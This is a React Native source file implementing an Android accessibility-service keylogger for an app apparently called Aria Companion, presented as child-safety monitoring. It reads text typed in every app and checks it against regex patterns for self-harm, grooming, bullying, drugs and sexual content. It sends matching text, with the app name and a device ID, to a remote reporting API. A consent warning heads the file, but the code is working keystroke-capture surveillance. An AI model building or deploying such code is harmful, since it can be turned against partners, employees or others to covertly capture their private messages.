// ═══════════════════════════════════════════════════════════════
// Keylogger — Android Accessibility Service
// ═══════════════════════════════════════════════════════════════
// ⚠️  CONTROVERSIAL — only use with explicit consent + legal basis
// Requires android.permission.BIND_ACCESSIBILITY_SERVICE
// Logs keystrokes for safety monitoring (cyberbullying, predators)
// ═══════════════════════════════════════════════════════════════

import { Platform, NativeModules } from 'react-native'
import { reportData } from './api'
import { getStoredDeviceId } from './api'

export type KeystrokeEvent = {
  id: string
  text: string
  appPackage: string
  appName: string
  timestamp: string
  flagged: boolean
  flagReason?: string
}

const FLAGGED_PATTERNS = [
  // Self-harm
  /kill myself/i, /cut myself/i, /suicide/i, /want to die/i, /end it all/i,
  // Predator
  /don'?t tell your (mom|dad|parents)/i, /our little secret/i, /meet me (alone|secretly)/i,
  // Cyberbullying
  /everyone hates you/i, /nobody likes you/i, /kill yourself/i, /you'?re worthless/i,
  // Drugs
  /\b(weed|cocaine|heroin|pills|mdma|lsd)\b/i, /getting high/i,
  // Explicit
  /send (nudes?|pics?|pictures?)/i, /\b(nudes?|naked)\b/i,
]

let isEnabled = false
let listener: any = null

/**
 * Enable keylogger (Android only).
 * Requires user to manually enable Accessibility Service:
 * Settings → Accessibility → Aria Companion → Enable
 */
export async function enableKeylogger(): Promise<boolean> {
  if (Platform.OS !== 'android') return false

  try {
    const { AccessibilityService } = NativeModules
    if (!AccessibilityService) return false

    const isRunning = await AccessibilityService.isRunning()
    if (!isRunning) {
      // Open accessibility settings
      await AccessibilityService.openSettings()
      return false
    }

    listener = AccessibilityService.addListener((event: any) => {
      handleKeystroke(event)
    })

    isEnabled = true
    return true
  } catch (e) {
    console.error('Failed to enable keylogger:', e)
    return false
  }
}

/**
 * Disable keylogger.
 */
export async function disableKeylogger(): Promise<void> {
  if (Platform.OS !== 'android') return

  try {
    const { AccessibilityService } = NativeModules
    if (!AccessibilityService) return

    if (listener) {
      listener.remove()
      listener = null
    }

    await AccessibilityService.stop()
    isEnabled = false
  } catch {}
}

/**
 * Check if keylogger is enabled.
 */
export function isKeyloggerEnabled(): boolean {
  return isEnabled
}

/**
 * Check if accessibility service is running.
 */
export async function isAccessibilityRunning(): Promise<boolean> {
  if (Platform.OS !== 'android') return false
  try {
    const { AccessibilityService } = NativeModules
    if (!AccessibilityService) return false
    return await AccessibilityService.isRunning()
  } catch {
    return false
  }
}

/**
 * Handle a keystroke event.
 */
async function handleKeystroke(event: { text: string; appPackage: string; appName: string }): Promise<void> {
  const { text, appPackage, appName } = event

  // Check for flagged content
  let flagged = false
  let flagReason: string | undefined

  for (const pattern of FLAGGED_PATTERNS) {
    if (pattern.test(text)) {
      flagged = true
      flagReason = `Matched pattern: ${pattern.source}`
      break
    }
  }

  // Only log if flagged (privacy — don't log every keystroke)
  if (flagged) {
    const keystroke: KeystrokeEvent = {
      id: `${Date.now()}-${Math.random()}`,
      text,
      appPackage,
      appName,
      timestamp: new Date().toISOString(),
      flagged: true,
      flagReason,
    }

    const deviceId = await getStoredDeviceId()
    if (deviceId) {
      await reportData(deviceId, 'KEYSTROKE_ALERT', keystroke)
    }
  }
}
